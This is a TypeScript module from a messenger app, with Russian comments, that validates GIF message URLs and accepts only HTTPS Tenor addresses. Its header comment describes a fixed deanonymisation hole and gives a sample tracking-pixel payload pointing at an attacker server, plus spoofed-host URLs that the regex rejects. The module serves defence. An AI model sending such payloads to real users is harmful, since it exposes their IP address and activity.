/**
 * gifEnvelope — чистый кодек GIF-сообщения ('\x0agif:').
 *
 * v4.32.240. Разбор был буквально `text.slice(PREFIX.length)` — то есть
 * произвольная строка от собеседника уезжала прямо в
 * `<Image source={{ uri }} />`.
 *
 * Для мессенджера, который весь построен вокруг того, чтобы не оставлять
 * следов, это деанонимизация в одно сообщение: достаточно прислать
 * '\x0agif:https://мой-сервер/т.gif?id=жертва', и в момент, когда переписка
 * окажется на экране, устройство само сходит на чужой сервер. Отправитель
 * получает IP-адрес получателя, его провайдера и точное время открытия чата —
 * притом что отметки о прочтении можно было отключить, а трафик приложения
 * идёт через VPN ровно затем, чтобы адрес не светить. Ни одного действия от
 * получателя при этом не требуется: картинка грузится сама.
 *
 * Отправляет GIF только встроенный подборщик, а он ходит в Tenor — значит и
 * принимать нужно только адреса Tenor. Всё остальное показывается заглушкой.
 *
 * Модуль без импортов: проверка недоверенного адреса нужна тестируемой.
 */

export const GIF_PREFIX = '\x0agif:';

/** Разумный потолок для адреса картинки. */
const MAX_GIF_URL = 512;

/**
 * Адрес на Tenor и только на нём.
 *
 * Разбор регулярным выражением, а не через URL: в React Native URL —
 * частичный полифил, и его поведение на кривом вводе отличается от браузера.
 *
 * После имени хоста обязан идти '/', поэтому не пройдут ни
 * 'https://tenor.com@зло.example/', ни 'https://tenor.com.зло.example/' —
 * оба выглядят как Tenor, но ведут на чужой сервер. Схема только https:
 * http отдал бы адрес ещё и всем, кто по дороге.
 */
const TENOR_URL = /^https:\/\/(?:[a-z0-9-]+\.)*tenor\.com\/[a-z0-9._~!$&'()*+,;=:@%/?-]*$/i;

/**
 * Тот же критерий, что и на приёме, — для подборщика. Ответ Tenor приходит по
 * сети, и отправлять оттуда адрес, который получатель обязан отбросить, значит
 * посылать заведомо пустой пузырь.
 */
export function isTenorGifUrl(url: string): boolean {
  if (!url || url.length > MAX_GIF_URL) return false;
  return TENOR_URL.test(url);
}

export function isGifMessage(text: string): boolean {
  return text.startsWith(GIF_PREFIX);
}

export function makeGifText(url: string): string {
  return `${GIF_PREFIX}${url}`;
}

/**
 * Адрес GIF из сообщения. null — не GIF либо адрес, которому нельзя дать
 * загрузиться; пузырь в этом случае рисует заглушку вместо картинки.
 */
export function parseGifUrl(text: string): string | null {
  if (!text.startsWith(GIF_PREFIX)) return null;
  const url = text.slice(GIF_PREFIX.length);
  return isTenorGifUrl(url) ? url : null;
}
